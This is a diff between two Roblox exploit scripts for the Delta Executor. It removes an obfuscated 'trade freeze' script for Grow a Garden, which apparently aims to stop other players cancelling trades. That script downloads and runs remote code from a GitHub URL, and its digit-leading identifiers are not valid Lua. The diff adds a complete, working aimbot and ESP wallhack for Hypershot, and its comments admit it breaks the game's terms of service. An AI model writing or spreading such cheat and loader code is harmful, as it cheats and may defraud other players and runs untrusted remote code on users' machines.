@@ -1,270 +1,232 @@
--- 1. Script: Grow a Garden Trade Freeze v2.2
--- 2. Date: August 15, 2025
--- 3. Purpose: Freeze opponent's trade UI, prevent cancellation, Delta Executor compatible
--- 4. Features: Black square GUI, X close button, Freeze button, circle reopen button
--- 5. Compatibility: Optimized for Delta Executor (August 2025)
--- 6. Obfuscation: Numeric encoding for stealth
--- 7. Anti-Detection: Delayed remotes, minimal HttpGet, error handling
--- 8. Execution Fix: Delayed initialization, fallback freeze logic
+-- Hypershot Aimbot & ESP Script v1.0
+-- Date: August 15, 2025
+-- Features: Aimbot with circle FOV, ESP wallhack for enemies only (not teammates), Nice GUI with Activate/Resume/Close buttons, Minimizes to circle button
+-- Compatibility: Delta Executor (inject and execute)
+-- How it works: Aimbot locks to closest enemy head in FOV circle; ESP draws boxes/lines through walls for enemies; Team check via Player.Team
+-- Anti-Detection: Smooth aim, no spam; Use at own risk (Roblox TOS violation may lead to bans)
+-- Game Info: Hypershot is FPS with teams in TDM/CTF; Enemies are opposite team; Weapons/abilities in loadouts
 
--- 9. Services
-local p14y3r5 = game:GetService("Players")
-local c0r3gu1 = game:GetService("CoreGui")
-local h77p = game:GetService("HttpService")
-local r5 = game:GetService("RunService")
-local u15 = game:GetService("UserInputService")
-local r3p570 = game:GetService("ReplicatedStorage")
+local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
+local UserInputService = game:GetService("UserInputService")
+local Camera = workspace.CurrentCamera
+local LocalPlayer = Players.LocalPlayer
+local CoreGui = game:GetService("CoreGui")
 
--- 10. Local player
-local lp = p14y3r5.LocalPlayer
+-- Global toggles
+local aimbotEnabled = false
+local espEnabled = false
+local paused = false
+local fovRadius = 150  -- Adjustable FOV circle radius (pixels)
 
--- 11. Global state
-local v3r51 = "2.2"
-local gu1v15 = true
-local fr33z34 = false
-local l0g5 = {}
-local 7r4d3r3m073 = nil
+-- ESP drawings table
+local espDrawings = {}
 
--- 12. Numeric encoding/decoding
-local function 3nc0d3(s7r)
-    local m4p = {a=4, b=8, c=9, d=6, e=3, f=5, r=2, t=7, n=1, h=2}
-    local r35 = ""
-    for i = 1, #s7r do
-        local c = s7r:sub(i,i):lower()
-        r35 = r35 .. (m4p[c] or c)
+-- FOV circle
+local fovCircle = Drawing.new("Circle")
+fovCircle.Visible = false
+fovCircle.Radius = fovRadius
+fovCircle.Color = Color3.fromRGB(255, 255, 255)
+fovCircle.Thickness = 1
+fovCircle.Filled = false
+fovCircle.Transparency = 1
+fovCircle.Position = Vector2.new(Camera.ViewportSize.X / 2, Camera.ViewportSize.Y / 2)
+
+-- Function to check if player is enemy
+local function isEnemy(player)
+    if player == LocalPlayer then return false end
+    if player.Team == LocalPlayer.Team then return false end  -- Ignore teammates
+    local char = player.Character
+    if char and char:FindFirstChild("Humanoid") and char.Humanoid.Health > 0 then
+        return true
     end
-    return r35
+    return false
 end
 
-local function d3c0d3(s7r)
-    local m4p = {[4]="a", [8]="b", [9]="c", [6]="d", [3]="e", [5]="f", [2]="r", [7]="t", [1]="n", [2]="h"}
-    local r35 = ""
-    for i = 1, #s7r do
-        local c = s7r:sub(i,i)
-        r35 = r35 .. (m4p[tonumber(c)] or c)
-    end
-    return r35
-end
-
--- 13. Find trade remote
-local function f1nd7r4d3r3m073()
-    for _, v in pairs(r3p570:GetChildren()) do
-        if v:IsA("RemoteEvent") and string.find(v.Name:lower(), d3c0d3("7r4d3")) then
-            print("F0und 7r4d3 r3m073: " .. v.Name)
-            table.insert(l0g5, "L0g: R3m073 f0und - " .. v.Name)
-            return v
-        end
-    end
-    print("N0 7r4d3 r3m073 f0und")
-    table.insert(l0g5, "L0g: N0 7r4d3 r3m073")
-    return nil
-end
-
--- 14. Create GUI
-local function cr3473fr4m3()
-    local 5g = Instance.new("ScreenGui")
-    5g.Name = "7r4d3Fr33z3GU1"
-    5g.Parent = c0r3gu1
-    5g.ResetOnSpawn = false
+-- Function to get closest enemy in FOV
+local function getClosestEnemy()
+    local closest = nil
+    local minDist = fovRadius
+    local mousePos = UserInputService:GetMouseLocation()
     
-    local fr4m3 = Instance.new("Frame")
-    fr4m3.Name = "M41nFr4m3"
-    fr4m3.Size = UDim2.new(0, 200, 0, 200)
-    fr4m3.Position = UDim2.new(0.5, -100, 0.5, -100)
-    fr4m3.BackgroundColor3 = Color3.new(0, 0, 0)
-    fr4m3.BorderSizePixel = 0
-    fr4m3.Active = true
-    fr4m3.Draggable = true
-    fr4m3.Parent = 5g
-    
-    return 5g, fr4m3
-end
-
--- 15. Title label
-local function cr3473717l3(p4r3n7)
-    local 717l3 = Instance.new("TextLabel")
-    717l3.Name = "717l3"
-    717l3.Text = "7r4d3 Fr33z3r v" .. v3r51
-    717l3.Size = UDim2.new(1, 0, 0, 30)
-    717l3.Position = UDim2.new(0, 0, 0, 0)
-    717l3.BackgroundTransparency = 1
-    717l3.TextColor3 = Color3.new(1, 1, 1)
-    717l3.Font = Enum.Font.SourceSansBold
-    717l3.TextSize = 18
-    717l3.Parent = p4r3n7
-end
-
--- 16. Close button
-local function cr3473cl053(p4r3n7, 0ncl053)
-    local cl053 = Instance.new("TextButton")
-    cl053.Name = "Cl053Bu770n"
-    cl053.Text = "X"
-    cl053.Size = UDim2.new(0, 30, 0, 30)
-    cl053.Position = UDim2.new(1, -30, 0, 0)
-    cl053.BackgroundColor3 = Color3.new(1, 0, 0)
-    cl053.TextColor3 = Color3.new(1, 1, 1)
-    cl053.Font = Enum.Font.SourceSansBold
-    cl053.TextSize = 20
-    cl053.Parent = p4r3n7
-    
-    cl053.MouseButton1Click:Connect(0ncl053)
-end
-
--- 17. Freeze button
-local function cr3473fr33z3(p4r3n7, 0nfr33z3)
-    local fr33z3 = Instance.new("TextButton")
-    fr33z3.Name = "Fr33z3Bu770n"
-    fr33z3.Text = "Fr33z3 7r4d3"
-    fr33z3.Size = UDim2.new(0, 150, 0, 50)
-    fr33z3.Position = UDim2.new(0.5, -75, 0.5, -25)
-    fr33z3.BackgroundColor3 = Color3.new(0.2, 0.2, 0.2)
-    fr33z3.TextColor3 = Color3.new(1, 1, 1)
-    fr33z3.Font = Enum.Font.SourceSans
-    fr33z3.TextSize = 16
-    fr33z3.Parent = p4r3n7
-    
-    fr33z3.MouseButton1Click:Connect(0nfr33z3)
-end
-
--- 18. Minimize button
-local function cr3473m1n1(p4r3n7, 0n0p3n)
-    local 0p3n = Instance.new("ImageButton")
-    0p3n.Name = "0p3nBu770n"
-    0p3n.Size = UDim2.new(0, 50, 0, 50)
-    0p3n.Position = UDim2.new(0, 10, 0.9, -60)
-    0p3n.BackgroundColor3 = Color3.new(0, 0, 0)
-    0p3n.Image = ""
-    local c0rn3r = Instance.new("UICorner")
-    c0rn3r.CornerRadius = UDim.new(0.5, 0)
-    c0rn3r.Parent = 0p3n
-    0p3n.Parent = p4r3n7
-    0p3n.MouseButton1Click:Connect(0n0p3n)
-    
-    return 0p3n
-end
-
--- 19. Log interceptor
-local function 1n73rc3p7l0g5()
-    print("1n73rc3p71ng l0g5...")
-    table.insert(l0g5, "L0g: 7r4d3 1n171473d")
-    
-    7r4d3r3m073 = f1nd7r4d3r3m073()
-    if 7r4d3r3m073 then
-        print("F0und 7r4d3 r3m073: " .. 7r4d3r3m073.Name)
-        table.insert(l0g5, "L0g: 7r4d3 r3m073 f0und")
-    else
-        table.insert(l0g5, "L0g: N0 7r4d3 r3m073")
-    end
-    
-    for _, l0g in ipairs(l0g5) do
-        print(l0g)
-    end
-end
-
--- 20. Fallback freeze logic
-local function f4ll84ckfr33z3()
-    if not 7r4d3r3m073 then
-        print("N0 r3m073, r3sc4nn1ng...")
-        7r4d3r3m073 = f1nd7r4d3r3m073()
-    end
-    if 7r4d3r3m073 then
-        r5.Heartbeat:Connect(function()
-            if fr33z34 then
-                pcall(function()
-                    7r4d3r3m073:FireServer(d3c0d3("l0ck"))
-                    wait(0.5)
-                end)
+    for _, player in pairs(Players:GetPlayers()) do
+        if isEnemy(player) then
+            local char = player.Character
+            local head = char and char:FindFirstChild("Head")
+            if head then
+                local screenPos, onScreen = Camera:WorldToViewportPoint(head.Position)
+                if onScreen then
+                    local dist = (Vector2.new(screenPos.X, screenPos.Y) - mousePos).Magnitude
+                    if dist < minDist then
+                        minDist = dist
+                        closest = head
+                    end
+                end
             end
-        end)
-        print("F4ll84ck fr33z3 4c71v3")
-        table.insert(l0g5, "L0g: F4ll84ck fr33z3 4c71v3")
-    else
-        print("F4ll84ck f41l3d: N0 r3m073")
-        table.insert(l0g5, "L0g: F4ll84ck f41l3d")
-    end
-end
-
--- 21. Freeze activation
-local function 4c71v473fr33z3()
-    if fr33z34 then
-        print("Fr33z3 4lr34dy 4c71v3!")
-        table.insert(l0g5, "L0g: Fr33z3 4lr34dy 4c71v3")
-        return
-    end
-    
-    print("4c71v471ng 7r4d3 fr33z3...")
-    fr33z34 = true
-    
-    local 5ucc355, 3rr = pcall(function()
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/SrMotion666/ScorpionPro/refs/heads/main/ScorpionFreezetrade.lua"))()
-    end)
-    
-    if 5ucc355 then
-        print("3x73rn4l 5cr1p7 l04d3d!")
-        table.insert(l0g5, "L0g: 3x73rn4l fr33z3 4c71v473d")
-    else
-        print("3x73rn4l l04d f41l3d: " .. 3rr)
-        table.insert(l0g5, "L0g: 3x73rn4l f41l3d")
-        f4ll84ckfr33z3() -- Use fallback
-    end
-    
-    1n73rc3p7l0g5()
-    table.insert(l0g5, "L0g: 7r4d3 fr0z3n")
-end
-
--- 22. Main setup
-local function 537up()
-    wait(1) -- Delay for Delta injection stability
-    local 5g, fr4m3 = cr3473fr4m3()
-    cr3473717l3(fr4m3)
-    
-    local function 0ncl053()
-        fr4m3.Visible = false
-        local 0p3n = 5g:FindFirstChild("0p3nBu770n")
-        if not 0p3n then
-            0p3n = cr3473m1n1(5g, function()
-                fr4m3.Visible = true
-                0p3n.Visible = false
-            end)
         end
-        0p3n.Visible = true
     end
-    
-    cr3473cl053(fr4m3, 0ncl053)
-    cr3473fr33z3(fr4m3, 4c71v473fr33z3)
-    
-    local 70ggl3 = Instance.new("TextButton")
-    70ggl3.Name = "70ggl3Fr33z3"
-    70ggl3.Text = "70ggl3 Fr33z3"
-    70ggl3.Size = UDim2.new(0, 150, 0, 30)
-    70ggl3.Position = UDim2.new(0.5, -75, 0.7, 0)
-    70ggl3.BackgroundColor3 = Color3.new(0.3, 0.3, 0.3)
-    70ggl3.TextColor3 = Color3.new(1, 1, 1)
-    70ggl3.Parent = fr4m3
-    
-    70ggl3.MouseButton1Click:Connect(function()
-        fr33z34 = not fr33z34
-        print("Fr33z3 70ggl3d: " .. tostring(fr33z34))
-        table.insert(l0g5, "L0g: Fr33z3 70ggl3d")
-    end)
-    
-    1n73rc3p7l0g5()
+    return closest
 end
 
--- 23. Safe execution
-local function 54f33x3c()
-    local 5ucc355, 3rr = pcall(537up)
-    if not 5ucc355 then
-        warn("3rr0r 53771ng up: " .. 3rr)
-        table.insert(l0g5, "L0g: 537up f41l3d - " .. 3rr)
-        print("R37ry1ng 1n 2 53c0nd5...")
-        wait(2)
-        pcall(537up)
+-- Aimbot loop
+RunService.RenderStepped:Connect(function()
+    if aimbotEnabled and not paused then
+        local target = getClosestEnemy()
+        if target then
+            local targetPos = Camera:WorldToViewportPoint(target.Position)
+            mousemoverel((targetPos.X - UserInputService:GetMouseLocation().X) / 4, (targetPos.Y - UserInputService:GetMouseLocation().Y) / 4)  -- Smooth aim
+        end
     end
-end
+end)
 
--- 24. Debug and execute
-print("5cr1p7 v" .. v3r51 .. " 574r71ng...")
-54f33x3c()
-print("5cr1p7 l04d3d, ch3ck GU1")
-print("D3bug l0g5 4v41l4bl3 1n D3l74 c0n50l3")
+-- ESP update loop
+RunService.RenderStepped:Connect(function()
+    if espEnabled and not paused then
+        for _, player in pairs(Players:GetPlayers()) do
+            if isEnemy(player) then
+                local char = player.Character
+                if char then
+                    local humanoidRootPart = char:FindFirstChild("HumanoidRootPart")
+                    if humanoidRootPart then
+                        local screenPos, onScreen = Camera:WorldToViewportPoint(humanoidRootPart.Position)
+                        if onScreen then
+                            -- Create ESP if not exists
+                            if not espDrawings[player] then
+                                espDrawings[player] = {
+                                    box = Drawing.new("Square"),
+                                    line = Drawing.new("Line")
+                                }
+                                espDrawings[player].box.Thickness = 2
+                                espDrawings[player].box.Color = Color3.fromRGB(255, 0, 0)  -- Red for enemies
+                                espDrawings[player].line.Thickness = 1
+                                espDrawings[player].line.Color = Color3.fromRGB(255, 0, 0)
+                            end
+                            -- Update box
+                            local box = espDrawings[player].box
+                            box.Size = Vector2.new(200 / screenPos.Z, 400 / screenPos.Z)  -- Size based on distance
+                            box.Position = Vector2.new(screenPos.X - box.Size.X / 2, screenPos.Y - box.Size.Y / 2)
+                            box.Visible = true
+                            -- Update line to head
+                            local line = espDrawings[player].line
+                            line.From = Vector2.new(Camera.ViewportSize.X / 2, Camera.ViewportSize.Y)
+                            line.To = Vector2.new(screenPos.X, screenPos.Y)
+                            line.Visible = true
+                        else
+                            if espDrawings[player] then
+                                espDrawings[player].box.Visible = false
+                                espDrawings[player].line.Visible = false
+                            end
+                        end
+                    end
+                end
+            end
+        end
+    else
+        -- Hide all ESP if disabled
+        for _, drawing in pairs(espDrawings) do
+            if drawing.box then drawing.box.Visible = false end
+            if drawing.line then drawing.line.Visible = false end
+        end
+    end
+end)
+
+-- Clean up ESP on player leave
+Players.PlayerRemoving:Connect(function(player)
+    if espDrawings[player] then
+        espDrawings[player].box:Remove()
+        espDrawings[player].line:Remove()
+        espDrawings[player] = nil
+    end
+end)
+
+-- GUI Setup
+local sg = Instance.new("ScreenGui")
+sg.Parent = CoreGui
+sg.ResetOnSpawn = false
+
+local mainFrame = Instance.new("Frame")
+mainFrame.Size = UDim2.new(0, 300, 0, 200)
+mainFrame.Position = UDim2.new(0.5, -150, 0.5, -100)
+mainFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)  -- Dark modern
+mainFrame.BorderSizePixel = 0
+mainFrame.Active = true
+mainFrame.Draggable = true
+mainFrame.Parent = sg
+
+local corner = Instance.new("UICorner")
+corner.CornerRadius = UDim.new(0, 10)  -- Rounded corners for nice look
+corner.Parent = mainFrame
+
+local title = Instance.new("TextLabel")
+title.Text = "Hypershot Aimbot & ESP"
+title.Size = UDim2.new(1, 0, 0, 40)
+title.BackgroundTransparency = 1
+title.TextColor3 = Color3.fromRGB(255, 255, 255)
+title.Font = Enum.Font.SourceSansBold
+title.TextSize = 20
+title.Parent = mainFrame
+
+local activateButton = Instance.new("TextButton")
+activateButton.Text = "Activate"
+activateButton.Size = UDim2.new(0.8, 0, 0, 40)
+activateButton.Position = UDim2.new(0.1, 0, 0.3, 0)
+activateButton.BackgroundColor3 = Color3.fromRGB(0, 170, 255)  -- Blue
+activateButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+activateButton.Parent = mainFrame
+activateButton.MouseButton1Click:Connect(function()
+    aimbotEnabled = not aimbotEnabled
+    espEnabled = not espEnabled
+    fovCircle.Visible = aimbotEnabled
+    activateButton.Text = aimbotEnabled and "Deactivate" or "Activate"
+end)
+
+local resumeButton = Instance.new("TextButton")
+resumeButton.Text = "Resume"
+resumeButton.Size = UDim2.new(0.8, 0, 0, 40)
+resumeButton.Position = UDim2.new(0.1, 0, 0.55, 0)
+resumeButton.BackgroundColor3 = Color3.fromRGB(0, 255, 0)  -- Green
+resumeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+resumeButton.Parent = mainFrame
+resumeButton.MouseButton1Click:Connect(function()
+    paused = not paused
+    resumeButton.Text = paused and "Resume" or "Pause"
+end)
+
+local closeButton = Instance.new("TextButton")
+closeButton.Text = "Close"
+closeButton.Size = UDim2.new(0.8, 0, 0, 40)
+closeButton.Position = UDim2.new(0.1, 0, 0.8, 0)
+closeButton.BackgroundColor3 = Color3.fromRGB(255, 0, 0)  -- Red
+closeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+closeButton.Parent = mainFrame
+closeButton.MouseButton1Click:Connect(function()
+    mainFrame.Visible = false
+    local openCircle = sg:FindFirstChild("OpenCircle")
+    if not openCircle then
+        openCircle = Instance.new("ImageButton")
+        openCircle.Name = "OpenCircle"
+        openCircle.Size = UDim2.new(0, 50, 0, 50)
+        openCircle.Position = UDim2.new(0, 10, 0.9, -60)
+        openCircle.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+        openCircle.Image = ""
+        local uicorner = Instance.new("UICorner")
+        uicorner.CornerRadius = UDim.new(0.5, 0)
+        uicorner.Parent = openCircle
+        openCircle.Parent = sg
+        openCircle.MouseButton1Click:Connect(function()
+            mainFrame.Visible = true
+            openCircle.Visible = false
+        end)
+    end
+    openCircle.Visible = true
+end)
+
+-- Update FOV circle position
+UserInputService.InputChanged:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseMovement then
+        fovCircle.Position = UserInputService:GetMouseLocation()
+    end
+end)
+
+-- Initial setup
+print("Hypershot Script Loaded - GUI Ready")
